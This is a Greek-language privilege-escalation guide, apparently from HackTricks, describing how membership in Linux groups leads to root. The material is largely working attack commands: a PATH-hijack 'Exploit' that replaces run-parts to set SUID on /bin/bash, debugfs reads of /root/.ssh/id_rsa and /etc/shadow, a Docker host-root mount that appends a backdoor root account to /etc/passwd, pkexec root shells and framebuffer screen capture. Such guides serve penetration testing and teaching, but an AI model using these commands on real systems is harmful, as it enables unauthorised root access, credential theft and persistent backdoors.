# Ενδιαφέρουσες ομάδες - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Ομάδες Sudo/διαχειριστών

### **PE - Μέθοδος 1**

**Μερικές φορές**, η πολιτική ενός συστήματος στο **/etc/sudoers** (ή ένα αρχείο που περιλαμβάνεται από αυτήν) περιέχει καταχωρίσεις όπως:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Αυτό σημαίνει ότι οποιοσδήποτε χρήστης αντιστοιχεί σε οποιαδήποτε από τις δύο εγγραφές μπορεί να εκτελέσει οποιαδήποτε εντολή ως οποιοσδήποτε χρήστης-στόχος μέσω του `sudo` (με την επιφύλαξη των υπόλοιπων κανόνων πολιτικής).<sup>[[3]](#references)</sup>

Αν ισχύει αυτό, για να **γίνεις root, μπορείς απλώς να εκτελέσεις**:

```
sudo su
```

Αν το `sudo -l` επιτρέπει μια περιορισμένη κλήση του `adduser` μόνο με όνομα χρήστη, ελέγξτε αν δημιουργεί μια ομώνυμη κύρια ομάδα που δεν υπάρχει ήδη. Ένας νέος λογαριασμός σε αυτή την ομάδα μπορεί να αποκτήσει δικαιώματα, αν η ισχύουσα πολιτική sudoers τα παραχωρεί ήδη στο `%group`. Επαληθεύστε τόσο τη συμπεριφορά δημιουργίας ομάδας όσο και τον κανόνα της ομάδας πριν θεωρήσετε ότι αυτό αποτελεί διαδρομή κλιμάκωσης δικαιωμάτων. Η δημιουργία λογαριασμού αλλάζει το σύστημα, γι’ αυτό ελέγξτε πρώτα την πολιτική.

### PE - Μέθοδος 2

Βρείτε όλα τα suid binaries και ελέγξτε αν υπάρχει το binary **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Αν το **pkexec είναι δυαδικό αρχείο SUID**, μπορεί να εκτελέσει ένα πρόγραμμα ως άλλος χρήστης μόνο όταν το polkit εξουσιοδοτεί την ενέργεια που ζητήθηκε· το bit SUID από μόνο του δεν εγγυάται δικαιώματα root. Ελέγξτε την εγκατεστημένη πολιτική και την εξουσιοδότηση της περιόδου λειτουργίας του χρήστη-στόχου, αντί να θεωρείτε ότι αρκεί η συμμετοχή στις ομάδες **sudo** ή **admin**.<sup>[[4]](#references)[[5]](#references)</sup>

Για τη διακριτή διαδρομή [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), επαληθεύστε πρώτα ότι το `pkexec` είναι εκτελέσιμο αρχείο **SUID που ανήκει στον root**. Ένα εγκατεστημένο δυαδικό αρχείο χωρίς αυτό το bit δεν αποτελεί την τοπική κλιμάκωση δικαιωμάτων SUID που περιγράφει η συμβουλευτική ανακοίνωση. Μια συμβολοσειρά έκδοσης upstream είναι απλώς μια ένδειξη: οι διανομές μπορούν να [ενσωματώσουν τη διόρθωση σε παλαιότερες εκδόσεις πακέτων](https://ubuntu.com/security/CVE-2021-4034), επομένως ελέγξτε το εγκατεστημένο πακέτο του προμηθευτή και τα μέτρα μετριασμού πριν χαρακτηρίσετε το σύστημα ευάλωτο.

Το [CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) αφορά διαφορετική διαδρομή του polkit: μια συνθήκη ανταγωνισμού εξουσιοδότησης D-Bus, όχι κάποιο ελάττωμα SUID του `pkexec`. Εξετάστε το εγκατεστημένο πακέτο polkit του προμηθευτή και αν μια προσβάσιμη προνομιούχα ενέργεια D-Bus μπορεί να επιφέρει κάποια χρήσιμη αλλαγή· μια διαδρομή δημιουργίας λογαριασμού απαιτεί επίσης κατάλληλη υπηρεσία, όπως το AccountsService, ενώ η πρόσβαση sudo της νέας ομάδας εξαρτάται από την ισχύουσα πολιτική sudo. Μια αναφερόμενη έκδοση του polkit ή μια εγκατεστημένη υπηρεσία αποτελούν απλώς ενδείξεις, ιδίως όταν οι προμηθευτές [ενσωματώνουν διορθώσεις σε παλαιότερες εκδόσεις](https://access.redhat.com/security/cve/cve-2021-3560). Η παθητική απαρίθμηση δεν πρέπει να ενεργοποιεί τη συνθήκη ανταγωνισμού.

Σε διανομές που εξακολουθούν να χρησιμοποιούν το παλαιότερο backend Local Authority, ελέγξτε τους κανόνες ομάδων του με:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Τα σχετικά ονόματα ομάδων και οι προεπιλογές διαφέρουν ανά διανομή· μια ομάδα είναι χρήσιμη εδώ μόνο αν την αναφέρει η τοπική πολιτική.<sup>[[5]](#references)</sup>

Για να **γίνετε root, μπορείτε να εκτελέσετε**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Αν προσπαθήσετε να εκτελέσετε το **pkexec** και εμφανιστεί αυτό το **σφάλμα**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

Σε μια συνεδρία SSH χωρίς καταχωρισμένο agent αυθεντικοποίησης, το `pkexec` μπορεί να αποτύχει με αυτό το σφάλμα, ακόμη κι αν η πολιτική θα επέτρεπε διαφορετικά την ενέργεια· το polkit τεκμηριώνει το `pkttyagent` ως agent αυθεντικοποίησης κειμένου για συνεδρίες χωρίς περιβάλλον εργασίας. Η ακριβής συμπεριφορά εξαρτάται από την έκδοση και τη διανομή, οπότε επαληθεύστε την τοπική πολιτική και τη ρύθμιση του agent. Μια λύση που αναφέρθηκε για επηρεαζόμενες εκδόσεις του NixOS χρησιμοποιεί **2 διαφορετικές συνεδρίες SSH**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Ένα ACL που αρνείται σε έναν λογαριασμό την πρόσβαση στο `su` ισχύει για αυτό το εκτελέσιμο, όχι για κάθε τρόπο εκτέλεσης μιας ενέργειας που επιτρέπεται σε διαχειριστή. Αν τα διαπιστευτήρια διαχειριστή έχουν εκτεθεί ανεξάρτητα, εξετάστε αν η ισχύουσα πολιτική polkit επιτρέπει μια ξεχωριστή ενέργεια, όπως την εκκίνηση μιας παροδικής υπηρεσίας συστήματος μέσω του `systemd-run`, ποια ταυτότητα δέχεται ο agent αυθεντικοποίησης και ποια ταυτότητα θα χρησιμοποιήσει η υπηρεσία που θα προκύψει. [Το polkit διακρίνει την αυθεντικοποίηση ως κάτοχος της συνεδρίας από την αυθεντικοποίηση ως διαχειριστής](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), ενώ [το systemd-run μπορεί να ζητήσει από τον διαχειριστή συστήματος μια παροδική υπηρεσία](https://systemd.io/CONTROL_GROUP_INTERFACE/). Μια καταχώριση ιστορικού, μια εγκατεστημένη εντολή ή ένα αναγνώσιμο αρχείο πολιτικής δεν αποδεικνύει από μόνο του ότι υπάρχει εξουσιοδότηση ή ότι τα διαπιστευτήρια είναι έγκυρα· η παθητική εξέταση δεν πρέπει να υποβάλλει διαπιστευτήρια ούτε να εκκινεί μονάδα.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel Group

Μερικές φορές, μια πολιτική sudoers μπορεί επίσης να περιλαμβάνει την εξής εγγραφή:

```
%wheel	ALL=(ALL:ALL) ALL
```

Αυτό σημαίνει ότι οποιοσδήποτε χρήστης αντιστοιχεί στην εγγραφή μπορεί να εκτελέσει οποιαδήποτε εντολή ως οποιοσδήποτε χρήστης-στόχος μέσω του `sudo` (με την επιφύλαξη των υπόλοιπων κανόνων πολιτικής).<sup>[[3]](#references)</sup>

Αν ισχύει αυτό, για να **γίνεις root, μπορείς απλώς να εκτελέσεις**:

```
sudo su
```

## Ομάδα shadow

Σε συστήματα όπου τα δικαιώματα το επιτρέπουν, οι χρήστες της ομάδας **shadow** μπορούν να **διαβάσουν** το **/etc/shadow**· επαληθεύστε τα πραγματικά δικαιώματα και τις ACL στο σύστημα-στόχο:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Λοιπόν, διαβάστε το αρχείο και προσπαθήστε να **crack some hashes**.

Μια σημαντική λεπτομέρεια για την κατάσταση κλειδώματος κατά την αξιολόγηση των hashes:
- Οι εγγραφές με `!` ή `*` γενικά δεν επιτρέπουν διαδραστική σύνδεση με κωδικό πρόσβασης.
- Το `!hash` σημαίνει ότι ο κωδικός πρόσβασης είχε κλειδωθεί· οι χαρακτήρες που απομένουν αντιστοιχούν στο πεδίο κωδικού πρόσβασης πριν από το κλείδωμα.
- Ένα πεδίο που περιέχει `*` δεν είναι έγκυρο hash `crypt(3)` και αποτρέπει τη σύνδεση UNIX με κωδικό πρόσβασης· μην συμπεραίνετε από αυτό αν είχε οριστεί προηγουμένως κωδικός πρόσβασης.
Αυτό είναι χρήσιμο για την ταξινόμηση λογαριασμών ακόμη κι όταν η άμεση σύνδεση είναι αποκλεισμένη.<sup>[[6]](#references)</sup>

## Ομάδα staff

**staff**: Επιτρέπει στους χρήστες να προσθέτουν τοπικές τροποποιήσεις στο σύστημα (`/usr/local`) χωρίς να χρειάζονται δικαιώματα root (σημειώστε ότι τα εκτελέσιμα στο `/usr/local/bin` βρίσκονται στη μεταβλητή PATH κάθε χρήστη και μπορεί να «υπερισχύσουν» των εκτελέσιμων με το ίδιο όνομα στα `/bin` και `/usr/bin`). Συγκρίνετέ την με την ομάδα "adm", η οποία σχετίζεται περισσότερο με την παρακολούθηση/ασφάλεια.<sup>[[2]](#references)[[7]](#references)</sup>

Σε διαμορφώσεις Debian όπου το `/usr/local/bin` προηγείται του `/usr/bin` στο `PATH` (όπως στα παρακάτω παραδείγματα), μια εντολή χωρίς πλήρη διαδρομή εκτελεί πρώτα το αντίγραφο στο `/usr/local/bin`· επιβεβαιώστε την ενεργή τιμή του `PATH` στο target.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Αν μια προνομιούχα διεργασία επιλύει μια εντολή χωρίς διαδρομή μέσω ενός εγγράψιμου `/usr/local/bin`, η αντικατάσταση αυτής της εντολής μπορεί να εκτελεστεί με τα προνόμια της διεργασίας· επιβεβαιώστε την πραγματική διαδρομή και τον τρόπο ενεργοποίησης πριν από τη δοκιμή.

Σε συστήματα Ubuntu, το `pam_motd` εκτελεί εκτελέσιμα scripts μέσω του `run-parts --lsbsysinit` ως root κατά τη σύνδεση· οι εργασίες cron μπορεί επίσης να χρησιμοποιούν το `run-parts`, αλλά αυτό εξαρτάται από τη διανομή και τις ρυθμίσεις.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Σε μια νέα σύνδεση SSH, το `pspy` μπορεί να βοηθήσει να επιβεβαιωθεί αν αυτή η διαδρομή πράγματι καλείται στον στόχο· μπορεί να παρατηρεί τις γραμμές εντολών των διεργασιών χωρίς δικαιώματα root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Ομάδα disk

Η συμμετοχή στην ομάδα **disk** μπορεί να παρέχει μη επεξεργασμένη πρόσβαση σε συσκευές μπλοκ και συχνά να είναι **σχεδόν ισοδύναμη με πρόσβαση root**· το Debian την περιγράφει ως σε μεγάλο βαθμό ισοδύναμη με root, αλλά επαληθεύστε τα πραγματικά δικαιώματα της συσκευής και τη διάταξη αποθήκευσης στον στόχο.<sup>[[7]](#references)</sup>

Συνηθισμένες διαδρομές συσκευών περιλαμβάνουν το `/dev/sd*`, αλλά οι NVMe και άλλες διατάξεις αποθήκευσης χρησιμοποιούν διαφορετικά ονόματα.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

Το `debugfs` λειτουργεί σε συστήματα αρχείων ext2/ext3/ext4· διαδρομές όπως `/root` και `/etc/shadow` παραπάνω είναι αρχεία μέσα στο ανοιγμένο σύστημα αρχείων, ενώ το δεύτερο όρισμα του `dump` είναι μια διαδρομή εξόδου στο εγγενές σύστημα αρχείων.<sup>[[8]](#references)</sup> Για παράδειγμα, αυτό εξάγει το `/tmp/asd1.txt` από το ανοιγμένο σύστημα αρχείων στο `/tmp/asd2.txt` στο εγγενές σύστημα αρχείων:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Η επιλογή `-w` ανοίγει το σύστημα αρχείων με δικαιώματα ανάγνωσης και εγγραφής, ενώ η εντολή `write` αντιγράφει ένα εγγενές αρχείο στο ανοιχτό σύστημα αρχείων. Αποφύγετε τη χρήση της σε προσαρτημένο ενεργό σύστημα αρχείων, καθώς οι άμεσες τροποποιήσεις μπορεί να το καταστρέψουν· όταν είναι δυνατό, εργαστείτε με ένα offline image.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Ομάδα Video

Με την εντολή `w` μπορείτε να βρείτε **ποιοι είναι συνδεδεμένοι στο σύστημα** και θα εμφανιστεί έξοδος όπως η ακόλουθη.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Η καταχώριση **tty1** αντιστοιχεί στην πρώτη εικονική κονσόλα του Linux· από μόνη της δεν αποδεικνύει ότι κάποιος χρήστης βρίσκεται φυσικά μπροστά στο μηχάνημα, ιδίως σε containers ή άλλα περιβάλλοντα.<sup>[[21]](#references)</sup>

Σε συστήματα που διαθέτουν συσκευή framebuffer με δυνατότητα ανάγνωσης, η συμμετοχή στην ομάδα **video** μπορεί να παρέχει πρόσβαση σε αυτήν τη συσκευή. Η διεπαφή framebuffer του Linux τεκμηριώνει το `/dev/fb0` ως συσκευή μνήμης με δυνατότητα ανάγνωσης, της οποίας το περιεχόμενο μπορεί να αντιγραφεί για τη λήψη στιγμιότυπου οθόνης· η διαδρομή `/sys/class/graphics/fb0/virtual_size` είναι διαθέσιμη μόνο όταν υπάρχει αυτό το χαρακτηριστικό fbdev στο sysfs, οπότε ελέγξτε πρώτα το σύστημα-στόχο.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Αν η εγκατεστημένη έκδοση του **GIMP** διαθέτει εισαγωγέα raw δεδομένων, ανοίξτε το **`screen.raw`** με αυτόν· η υποστήριξη και τα στοιχεία ελέγχου διαφέρουν ανάλογα με την έκδοση και το plug-in.<sup>[[22]](#references)</sup>

![Ομάδα δίσκου - Ομάδα βίντεο: Για να ανοίξετε την εικόνα raw, μπορείτε να χρησιμοποιήσετε το GIMP, να επιλέξετε το αρχείο screen.raw και ως τύπο αρχείου να επιλέξετε Raw image data](<../../../images/image (463).png>)

Ορίστε το πλάτος και το ύψος της εικόνας ώστε να αντιστοιχούν στις διαστάσεις του framebuffer· δοκιμάστε τις διαθέσιμες μορφές pixel/τύπους εικόνας μέχρι η έξοδος να είναι ευανάγνωστη.<sup>[[9]](#references)</sup>

![Ομάδα δίσκου - Ομάδα βίντεο: Έπειτα αλλάξτε το πλάτος και το ύψος ώστε να αντιστοιχούν σε αυτά που χρησιμοποιούνται στην οθόνη και δοκιμάστε διαφορετικούς τύπους εικόνας (και επιλέξτε αυτόν που εμφανίζει καλύτερα την οθόνη)](<../../../images/image (317).png>)

## Ομάδα root

Η συμμετοχή στην ομάδα **root** δεν παρέχει το UID του root, αλλά αρχεία με δυνατότητα εγγραφής από την ομάδα και ιδιοκτησία του `root` μπορεί να έχουν ενδιαφέρον όταν χρησιμοποιούνται από προνομιούχες υπηρεσίες ή βιβλιοθήκες. Επαληθεύστε τα πραγματικά δικαιώματα του αρχείου και τον τρόπο χρήσης του πριν το θεωρήσετε διαδρομή κλιμάκωσης προνομίων.

**Ελέγξτε ποια αρχεία μπορούν να τροποποιήσουν τα μέλη της ομάδας root**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

Η συμμετοχή στην ομάδα `docker` παρέχει πρόσβαση σε επίπεδο root στο Docker daemon σε τυπικές rootful εγκαταστάσεις. Επειδή τα bind mounts είναι εγγράψιμα από προεπιλογή, ένας χρήστης που μπορεί να ελέγχει αυτό το daemon μπορεί να προσαρτήσει το `/` του host σε ένα container και να τροποποιήσει αρχεία του host· αυτό ουσιαστικά παρέχει δικαιώματα root στον host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Η συμμετοχή σε ομάδες μπορεί να μην είναι συγχρονισμένη μεταξύ των `/etc/group`, `/etc/gshadow` και του token της τρέχουσας διεργασίας. Αν ένας χρήστης απουσιάζει από το `id -nG`, αλλά το `newgrp docker` πετυχαίνει, ελέγξτε την ομάδα που εμφανίζει το `id` στο νέο shell και δοκιμάστε αν το Docker socket είναι πράγματι εγγράψιμο και εξυπηρετεί ένα rootful daemon. Το όνομα της ομάδας από μόνο του δεν αποδεικνύει ότι υπάρχει έλεγχος του host. Θέστε χρονικό όριο σε κάθε αυτοματοποιημένη δοκιμή `newgrp`, ώστε μια προτροπή κωδικού πρόσβασης να μην καθυστερεί την απαρίθμηση.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Τέλος, αν δεν σου αρέσει καμία από τις προηγούμενες προτάσεις ή δεν λειτουργούν για κάποιο λόγο (π.χ. docker api firewall), μπορείς πάντα να δοκιμάσεις να **εκκινήσεις ένα privileged container και να κάνεις escape από αυτό**, όπως εξηγείται εδώ:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Αν έχεις δικαιώματα εγγραφής στο docker socket, διάβασε [**αυτήν την ανάρτηση σχετικά με την κλιμάκωση προνομίων μέσω κατάχρησης του docker socket**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Ομάδα Adm

Συνήθως τα **μέλη** της ομάδας **`adm`** έχουν δικαιώματα να **διαβάζουν αρχεία καταγραφής** που βρίσκονται μέσα στο _/var/log/_.\
Επομένως, αν έχεις παραβιάσει έναν χρήστη αυτής της ομάδας, πρέπει οπωσδήποτε να **ελέγξεις τα αρχεία καταγραφής**.<sup>[[7]](#references)</sup>

## Ομάδες Backup / Operator / lp / Mail

Αυτές οι ομάδες έχουν σημασίες που εξαρτώνται από την υπηρεσία και τη διανομή. Το Debian τεκμηριώνει την ομάδα `backup` για ανάθεση εργασιών δημιουργίας αντιγράφων ασφαλείας/επαναφοράς, την `lp` για τους δαίμονες εκτυπωτών και την `mail` για το `/var/mail`. Επομένως, έλεγξε τα τοπικά δικαιώματα προτού θεωρήσεις ότι η συμμετοχή σε αυτές αποτελεί οδό κλιμάκωσης προνομίων.<sup>[[7]](#references)</sup>

Συχνά αποτελούν διαδρομές **εντοπισμού διαπιστευτηρίων** και όχι άμεσες διαδρομές προς root:
- **backup**: μπορεί να εκθέτει αρχεία αρχειοθέτησης με ρυθμίσεις, κλειδιά, dumps βάσεων δεδομένων ή tokens.
- **operator**: πρόσβαση σε λειτουργίες ειδική για την πλατφόρμα, η οποία μπορεί να διαρρεύσει ευαίσθητα δεδομένα χρόνου εκτέλεσης.
- **lp**: οι ουρές/ουρές εκτύπωσης μπορεί να περιέχουν το περιεχόμενο εγγράφων.
- **mail**: οι ουρές αλληλογραφίας μπορεί να εκθέτουν συνδέσμους επαναφοράς, OTP και εσωτερικά διαπιστευτήρια.

Θεώρησε τη συμμετοχή σε αυτές τις ομάδες εύρημα υψηλής αξίας σχετικά με την έκθεση δεδομένων και συνέχισε διερευνώντας την επαναχρησιμοποίηση κωδικών πρόσβασης/tokens.

## Ομάδα Auth

Στο OpenBSD, όταν είναι ρυθμισμένο το S/Key, το `/etc/skey` ανήκει στον `root:auth` και για την πρόσβαση στις εγγραφές του απαιτείται η ομάδα `auth`. Οι εγγραφές YubiKey αποθηκεύονται στο `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Μια ευάλωτη ρύθμιση του OpenBSD 6.6 με ενεργοποιημένο το S/Key ή το YubiKey επέτρεπε σε τοπικούς χρήστες με προνόμια `auth` να αποκτήσουν δικαιώματα root. Η Qualys τεκμηριώνει τις προϋποθέσεις και την αλυσίδα εκμετάλλευσης, ενώ το συνδεδεμένο PoC την υλοποιεί.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Έλεγχος ταυτότητας pkexec/pkttyagent χωρίς συνεδρία GUI (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Εγχειρίδια Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Εγχειρίδιο αναφοράς polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Εγχειρίδιο αναφοράς polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Εγχειρίδιο Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Εγχειρίδιο ασφάλειας Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Εγχειρίδιο Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Η συσκευή Frame Buffer — Τεκμηρίωση του πυρήνα Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Εγχειρίδια Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Εγχειρίδια Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — Παρακολούθηση διεργασιών Linux χωρίς προνόμια](https://github.com/DominicBreuker/pspy)
- [13] [Ασφάλεια Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Διαχείριση του Docker ως χρήστης χωρίς δικαιώματα root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Εκτέλεση containers — Τεκμηρίωση Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — Σελίδες εγχειριδίου OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — Σελίδες εγχειριδίου OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Ευπάθειες ελέγχου ταυτότητας στο OpenBSD — Συμβουλευτικό δελτίο ασφαλείας της Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC τοπικής εκμετάλλευσης](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Εγχειρίδιο Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Συσκευές που έχουν εκχωρηθεί στο Linux (έκδοση 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Εισαγωγή και εξαγωγή εικόνων — Τεκμηρίωση GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
